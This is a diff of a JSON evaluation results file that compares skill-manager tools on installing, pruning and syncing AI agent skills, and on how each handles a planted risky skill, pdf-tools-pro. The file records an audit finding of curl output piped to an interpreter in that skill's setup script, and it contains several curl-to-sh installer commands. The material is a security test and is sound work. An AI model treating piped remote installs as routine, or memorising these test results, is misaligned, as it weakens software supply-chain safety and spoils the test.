+    "note": "Local folders accepted directly via --local (one skill per call; files copied into ~/.skills/store). 20 skills ended up in ~/.claude/skills. Context went 21137 -> 21482 tokens."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "Adding local source: /home/runner/work/input/risky/pdf-tools-pro\nSkill name: pdf-tools-pro\nCopying files...\nSuccessfully added skill: pdf-tools-pro\n---\nSyncing skills to all targets...\n\n  claude: Synced\n\nSync complete.",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": true,
+    "how": "skills source list; skills source remove <name> for each of the 16 unwanted skills (incl. pdf-tools-pro); skills sync",
+    "could_list": true,
+    "note": "source remove only deletes from the store; a 'skills sync' is needed to update ~/.claude/skills (sync wipes and re-copies each target dir). 5 skills left; context 21485 -> 21277 tokens."
+   },
+   "step4": {
+    "done": true,
+    "how": "skills target add codex ~/.codex/skills  (custom target; performs an initial sync)",
+    "note": "Codex is not a predefined target (cursor, claude, gemini, vscode, opencode, windsurf, antigravity), but custom paths are supported. Targets cannot get different skill sets: every target receives the whole store, so Codex got the same 5 skills. Caution: sync deletes everything already in a target dir."
+   },
+   "loads_on_demand": "not stated"
+  },
+  "commit": "f176f041c20a"
+ },
+ {
+  "repo": "microsoft/apm",
+  "kind": "general",
+  "stars": 3954,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 2.6,
+  "installed_20": true,
+  "risky": "showed the source only",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "docs/concepts/package-anatomy.md: SKILL.md skills are 'Loaded on demand by harnesses that support skills.' APM itself only deploys files; on-demand loading is up to the harness.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "curl -sSL https://aka.ms/apm-unix | sh  (failed: prebuilt binary needs glibc 2.38+, and its pip fallback hit PEP 668) -> README's pip method in a venv: python3 -m venv ~/.apm-venv && ~/.apm-venv/bin/pip install apm-cli  (APM 0.33.0)",
+   "step1": {
+    "done": true,
+    "how": "apm install -g -t claude /home/runner/work/input/library/<each of 20 folders>",
+    "note": "APM installs local paths directly (no git needed). User scope (~/.apm/apm.yml). All 20 deployed to ~/.claude/skills. Context tokens: 21137 at baseline, 21482 after."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "[i] Installing to user scope (~/.apm/)\n[!] User-scope primitives are fully supported by claude, kiro, gemini, \ngrok-build, grok-cloud, agent-skills, openclaw, hermes, copilot-cowork, \ncopilot-app. Partially supported: copilot, cursor, opencode, antigravity, codex,\nwindsurf.\nSome primitives are not supported: cursor (instructions); opencode (hooks); \nantigravity (instructions, hooks); windsurf (instructions)\n[*] Validating 1 package...\n[+] /home/runner/work/input/risky/pdf-tools-pro\n[*] Updated apm.yml with 1 new package(s)\n[>] Installing 1 new package...\n[>] Resolving /home/runner/work/input/risky/pdf-tools-pro...\n  [+] /home/runner/work/input/risky/pdf-tools-pro (local)\n  |-- Skill integrated -> .claude/skills/\n  [+] <project root> (local)\n  |-- (files unchanged)\n  [i] Skipped inactive experimental resolver for target 'copilot-cowork' during \nlockfile reconciliation.\n  [i] Skipped inactive experimental resolver for target 'copilot-app' during \nlockfile reconciliation.\n[*] Installed 1 APM dependency in 0.2s.\n",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note": "Only the local source path was shown. scripts/setup.sh was copied silently to ~/.claude/skills/pdf-tools-pro/scripts/setup.sh. The script was never run."
+   },
+   "step3": {
+    "done": true,
+    "how": "apm deps list -g ; apm uninstall -g _local/<name> for the 15 unneeded library skills + _local/pdf-tools-pro",
+    "could_list": true,
+    "note": "16 packages removed from ~/.apm/apm.yml and from deployed files. ~/.claude/skills now holds only csv-cleaner, git-commit-message, pr-description, readme-polisher, sql-explainer. Context tokens: 21277."
+   },
+   "step4": {
+    "done": true,
+    "how": "apm install -g -t claude,codex",
+    "note": "APM deploys Codex skills to the shared ~/.agents/skills/ folder (its documented Codex skill path), not ~/.codex/skills. ~/.agents/skills now holds the same 5 skills. The global apm.yml 'targets' field still lists only claude."
+   },
+   "loads_on_demand": "docs/concepts/package-anatomy.md: SKILL.md skills are 'Loaded on demand by harnesses that support skills.' APM itself only deploys files; on-demand loading is up to the harness."
+  },
+  "commit": "280b8a7b115b"
+ },
+ {
+  "repo": "runkids/skillshare",
+  "kind": "general",
+  "stars": 2715,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 3.1,
+  "installed_20": true,
+  "risky": "warned",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21519,
+  "tokens_pruned": 21312,
+  "extra_tokens_20": 382,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "Stated. The docs (website/docs/reference/commands/analyze.md, sync.md) say that the name and description from each SKILL.md frontmatter are 'always loaded' into context on every request so the agent can match skills, and that the skill body is 'on-demand', loaded only when the skill is triggered. The 'skillshare new' docs describe Anthropic's three-level progressive disclosure, in which references/ and scripts/ are loaded on demand. sync prints an estimate, e.g. 'Context ~339 tokens always loaded · ~3.1K on demand'. skillshare manages files only; the agent does the loading.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "curl -fsSL https://raw.githubusercontent.com/runkids/skillshare/main/install.sh | sh  (installed skillshare v0.25.3 to ~/.local/bin), then: skillshare init --no-copy --git --no-skill --targets claude",
+   "step1": {
+    "done": true,
+    "how": "skillshare install ~/work/input/library --all && skillshare sync",
+    "note": "Local path accepted, no git needed. Because the parent folder has no SKILL.md, it printed '! no SKILL.md found in skill directory' and installed the 20 skills into a 'library/' group in the source. sync symlinked them into ~/.claude/skills as library__<name> (flat naming). sync said: '~339 tokens always loaded · ~3.1K on demand'. measure: 21519 tokens (baseline was 21137). It counted 21 entries because of .skillshare-manifest.json."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "✓ Source    ~/work/input/risky/pdf-tools-pro\n! Audit     1 finding: HIGH=1 — findings detected, but none at/above block threshold (CRITICAL) · risk HIGH (15/100)\n! HIGH: Remote code execution: curl output piped to interpreter\n  scripts/setup.sh:4\n✓ Install   pdf-tools-pro → ~/.config/skillshare/skills/pdf-tools-pro\n\nNext\n  skillshare sync  link it into your targets\n",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": true,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note": "Ran without --force/--yes, with stdin closed. The tool audited the skill automatically and reported a HIGH finding: 'Remote code execution: curl output piped to interpreter' at scripts/setup.sh:4. It did not list the skill's scripts; it only named the file that had the finding. The default block threshold is CRITICAL, so the install went ahead without asking (exit 0). It then went into Claude Code with 'skillshare sync'. setup.sh was never run."
+   },
+   "step3": {
+    "done": true,
+    "how": "skillshare list; skillshare uninstall pdf-tools-pro library/accessibility-check library/api-docs-writer library/changelog-writer library/cron-explainer library/dependency-updater library/dockerfile-review library/env-var-auditor library/i18n-extractor library/json-schema-maker library/log-summarizer library/meeting-notes library/perf-profiler-notes library/regex-helper library/typo-finder library/unit-test-scaffold --force (after a -n dry run); skillshare sync",
+    "could_list": true,
+    "note": "16 skills were moved to the tool's trash, which keeps them for 7 days. --force skips the confirmation prompt, which cannot be answered in a non-interactive shell. sync then reported '5 linked · 16 pruned'. measure: 21312 tokens. It counted 6 entries: 5 skills plus the manifest."
+   },
+   "step4": {
+    "done": true,
+    "how": "mkdir -p ~/.agents/skills; skillshare target add codex ~/.agents/skills; skillshare sync",
+    "note": "Codex is not installed, so 'skillshare init --discover --select codex' printed 'No new AI tools found'. 'target add codex' with no path failed with a usage error. With the path the tool's targets.yaml lists for Codex (~/.agents/skills), it failed because the path did not exist. I created that empty directory, which held no skill files, and the target was then added. sync: 'claude 5 linked, codex 5 linked'. ~/.agents/skills now has symlinks to the 5 skills. Claude measure unchanged at 21312."
+   },
+   "loads_on_demand": "Stated. The docs (website/docs/reference/commands/analyze.md, sync.md) say that the name and description from each SKILL.md frontmatter are 'always loaded' into context on every request so the agent can match skills, and that the skill body is 'on-demand', loaded only when the skill is triggered. The 'skillshare new' docs describe Anthropic's three-level progressive disclosure, in which references/ and scripts/ are loaded on demand. sync prints an estimate, e.g. 'Context ~339 tokens always loaded · ~3.1K on demand'. skillshare manages files only; the agent does the loading."
+  },
+  "commit": "5e3840ef6fb4"
+ },
+ {
+  "repo": "infragate/capa",
+  "kind": "general",
+  "stars": 724,
+  "grade": "safe",
+  "ran": true,
+  "untested": "project-scope",
+  "reason": "Installs per project (./.claude/skills), never globally; it installed, pruned and synced the project copy, which the home-folder measurement does not see.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "curl -LsSf https://capa.sh/install.sh | sh   (capa 2.2.4 -> ~/.local/bin/capa; installer script identical to ~/src/install.sh; binary checksum verified; ended with harmless 'sh: 554: Bad substitution' after success)",
+   "step1": {
+    "done": true,
+    "how": "mkdir ~/work/project && cd ~/work/project && capa init; for d in ~/work/input/library/*/; do capa add \"$d\"; done; capa install -p claude-code --yes",
+    "note": "capa accepts local skill folders (type: local). It is strictly project-scoped: skills were written to ~/work/project/.claude/skills (22 dirs: the 20 library skills + 2 capa default skills 'capabilities-manager' and 'bootstrap' that capa init adds automatically). It has no user/global install mode, so measure.sh still reports 0 skills in ~/.claude/skills and unchanged 21137 tokens. Install also silently added 12 'capa-sys-activity' hooks to .claude/settings.json (agentActivity default-on). --yes used because the shell is non-interactive (README says this is required)."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "$ capa add /home/runner/work/input/risky/pdf-tools-pro\nUsing /home/runner/work/project/capabilities.yaml\n✓ Found SKILL.md at /home/runner/work/input/risky/pdf-tools-pro/SKILL.md\n✓ Added skill \"pdf-tools-pro\" to /home/runner/work/project/capabilities.yaml\n  Type: local\n  Path: /home/runner/work/input/risky/pdf-tools-pro\n\nCapabilities file updated. Run capa install.\n\n$ capa install -p claude-code --dry-run\n●  Executable surface for this install:\n●  (no executable MCP servers, hooks, formatters, plugins, or secret commands)\n●  Dry run — no changes were made.\n\n$ capa install -p claude-code   (no --yes; no prompt appeared)\n❯ Resolving plugins\n✔ Resolving plugins\n❯ Validating install paths\n✔ Validating install paths\n❯ Checking for removed skills\n✔ Checking for removed skills\n❯ Installing skills\n  › [1/23] capabilities-manager\n  › [2/23] bootstrap\n  › [3/23] accessibility-check\n  › [4/23] api-docs-writer\n  › [5/23] changelog-writer\n  › [6/23] cron-explainer\n  › [7/23] csv-cleaner\n  › [8/23] dependency-updater\n  › [9/23] dockerfile-review\n  › [10/23] env-var-auditor\n  › [11/23] git-commit-message\n  › [12/23] i18n-extractor\n  › [13/23] json-schema-maker\n  › [14/23] log-summarizer\n  › [15/23] meeting-notes\n  › [16/23] perf-profiler-notes\n  › [17/23] pr-description\n  › [18/23] readme-polisher\n  › [19/23] regex-helper\n  › [20/23] sql-explainer\n  › [21/23] typo-finder\n  › [22/23] unit-test-scaffold\n  › [23/23] pdf-tools-pro\n✔ Installed 23 skills\n❯ Configuring instruction files\n✔ Configuring instruction files\n❯ Writing lockfile\n✔ Writing lockfile\n❯ Pruning orphan rules\n✔ Pruning orphan rules\n❯ Configuring tools\n  › no tools configured\n  › validating…\n✔ Configuring tools\n❯ Registering MCP server\n  - No Claude Code config found (already removed)\n✔ Registering MCP server\n❯ Pruning orphan hooks\n✔ Pruning orphan hooks\n❯ Syncing agent activity hooks\n✔ Agent activity hooks synced (12 entries)\n│\n│  ✓ Done in 0.2s · 35 added",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": true,
+    "how": "Listed via the capabilities file (grep '- id:' capabilities.yaml) since there is no list command; removed all skills except the 5 from capabilities.yaml (capa's documented 'file is source of truth' workflow) then ran capa install -p claude-code --yes, whose 'Checking for removed skills' step pruned the others incl. pdf-tools-pro and the 2 capa default skills",
+    "could_list": false,
+    "note": "capa has no 'list' or 'remove/uninstall' CLI commands; only 'capa clean' (removes everything). The only list is reading capabilities.yaml/lock or the Web UI. Removal works by editing capabilities.yaml and re-running install. Result: .claude/skills contains exactly csv-cleaner, git-commit-message, pr-description, readme-polisher, sql-explainer. No manual rm of skill folders was done."
+   },
+   "step4": {
+    "done": true,
+    "how": "capa install -p codex --yes",
+    "note": "Wrote the same 5 skills to ~/work/project/.agents/skills (Codex's project skills dir) plus .codex/config.toml with 10 activity hooks; .claude/skills untouched. Project-scoped only, not ~/.codex. capabilities.lock was no longer present afterwards."
+   },
+   "loads_on_demand": "Docs only claim on-demand loading for MCP *tools* via the gateway ('lazy-loads tools on demand', setup_tools/call_tool, 19-40% fewer tokens). Nothing is stated about loading skills only when needed; skills are written as normal SKILL.md folders and left to the agent's own skill loading."
+  },
+  "risky": "showed the source only (unverified)",
+  "minutes": 3.4
+ },
+ {
+  "repo": "pivoshenko/kasetto",
+  "kind": "general",
+  "stars": 209,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 4.1,
+  "installed_20": true,
+  "risky": "showed the source only",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated (README and docs do not discuss on-demand/progressive loading or context-token cost; the security docs only say 'It does not run skill code')",
+  "report": {
+   "installed_tool": true,
+   "install_command": "curl -fsSL kasetto.dev/install | sh  (README standalone installer; its prebuilt aarch64-linux-gnu binary failed: requires GLIBC_2.39, system has 2.36) -> fallback to README's Cargo method: rustup (minimal) then `cargo install kasetto` (kasetto 3.10.0, binaries kst/kasetto)",
+   "step1": {
+    "done": true,
+    "how": "kst init --global; set `agent: claude-code` in ~/.config/kasetto/kasetto.yaml (as kst init instructs); kst add ~/work/input/library --config ~/.config/kasetto/kasetto.yaml",
+    "note": "Local folder paths accepted directly, no git needed. Added as skills: \"*\"; all 20 copied to ~/.claude/skills. measure: 21137 -> 21482 context tokens."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "Adding /home/runner/work/input/risky/pdf-tools-pro to skills\n✓ Resolved 2 sources · 21 items\n\n✓ /home/runner/work/input/library\n├─ ✓ unchanged accessibility-check\n├─ ✓ unchanged api-docs-writer\n├─ ✓ unchanged changelog-writer\n├─ ✓ unchanged cron-explainer\n├─ ✓ unchanged csv-cleaner\n├─ ✓ unchanged dependency-updater\n├─ ✓ unchanged dockerfile-review\n├─ ✓ unchanged env-var-auditor\n├─ ✓ unchanged git-commit-message\n├─ ✓ unchanged i18n-extractor\n├─ ✓ unchanged json-schema-maker\n├─ ✓ unchanged log-summarizer\n├─ ✓ unchanged meeting-notes\n├─ ✓ unchanged perf-profiler-notes\n├─ ✓ unchanged pr-description\n├─ ✓ unchanged readme-polisher\n├─ ✓ unchanged regex-helper\n├─ ✓ unchanged sql-explainer\n├─ ✓ unchanged typo-finder\n└─ ✓ unchanged unit-test-scaffold\n✓ /home/runner/work/input/risky/pdf-tools-pro\n└─ + added     pdf-tools-pro\nInstalled 1 item in 3ms\n  0 updated  1 added  0 removed  20 unchanged",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": true,
+    "how": "kst list --type skills; kst remove ~/work/input/risky/pdf-tools-pro --config <cfg>; (kst remove <library> --skill <15 names> was rejected: 'uses a wildcard in skills:; remove the whole entry with --skill \"*\"'); so: kst remove ~/work/input/library --skill \"*\" --no-sync --config <cfg>; kst add ~/work/input/library --config <cfg> --skill csv-cleaner --skill sql-explainer --skill git-commit-message --skill pr-description --skill readme-polisher",
+    "could_list": true,
+    "note": "kst list showed all 21 skills grouped by source. pdf-tools-pro removed via kst remove; the other 15 pruned by sync after re-adding the library with only the 5 named skills. Partial removal from a wildcard entry is not supported directly. 5 skills remain; measure: 21277 context tokens."
+   },
+   "step4": {
+    "done": true,
+    "how": "Changed config to `agent: [claude-code, codex]`, then kst sync --config ~/.config/kasetto/kasetto.yaml",
+    "note": "The same 5 skills now exist in ~/.agents/skills (Codex path per README) as well as ~/.claude/skills. measure.sh only reports ~/.claude/skills (5) and 21277 tokens."
+   },
+   "loads_on_demand": "not stated (README and docs do not discuss on-demand/progressive loading or context-token cost; the security docs only say 'It does not run skill code')"
+  },
+  "commit": "296c9c30d665"
+ },
+ {
+  "repo": "egebese/skill-manager",
+  "kind": "general",
+  "stars": 38,
+  "grade": "safe",
+  "ran": true,
+  "untested": "different-job",
+  "reason": "Not an installer: a skill that analyses installed skills and lists the ones to disable in CLAUDE.md.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npx skills add egebese/skill-manager -g -y",
+   "step1": {
+    "done": false,
+    "how": "not possible: skill-manager has no install command (its script only offers --detect-stack and --analyze)",
+    "note": "skill-manager is itself a skill (SKILL.md + analyze_project.py). It analyzes skills that are already installed and only 'disables' them by writing a list into the project's CLAUDE.md. It cannot install skills from local folders or from git. The README installs it with the separate `npx skills` CLI, but that is a different tool, so I did not use it. measure.sh installed-20: 21194 tokens, 1 skill (skill-manager only)."
+   },
+   "step2": {
+    "done": false,
+    "tool_output": "",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": false,
+    "how": "python3 -I ~/.agents/skills/skill-manager/scripts/analyze_project.py --analyze ~/work (lists installed skills with tiers); no remove command exists",
+    "could_list": true,
+    "note": "--analyze lists the installed skills it finds in ~/.agents/.skill-lock.json, ~/.agents/skills and ~/.claude/skills. Here it found only skill-manager (universal). The tool cannot uninstall anything. The most it does is add a 'Disabled Skills' section to CLAUDE.md telling Claude to ignore skills, and those skills stay installed and still load. Nothing else was installed, so there was nothing to prune. measure.sh pruned: 21194 tokens, 1 skill."
+   },
+   "step4": {
+    "done": null,
+    "how": "not supported",
+    "note": "skill-manager cannot sync skills to Codex or any other agent. It only handles Claude Code, through CLAUDE.md. The `npx skills` installer used to install it does link skills to Codex and others, but that is a separate tool. measure.sh synced: 21194 tokens, 1 skill."
+   },
+   "loads_on_demand": "Not stated as on-demand loading. The README claims you 'Save ~4,000 tokens per conversation' by listing irrelevant skills in CLAUDE.md as 'should be ignored'. It also says 'Claude Code has no native disabledSkills setting', so skills are not unloaded: their metadata still loads, and CLAUDE.md gets longer."
+  },
+  "risky": "-",
+  "minutes": 1.6
+ }
+]
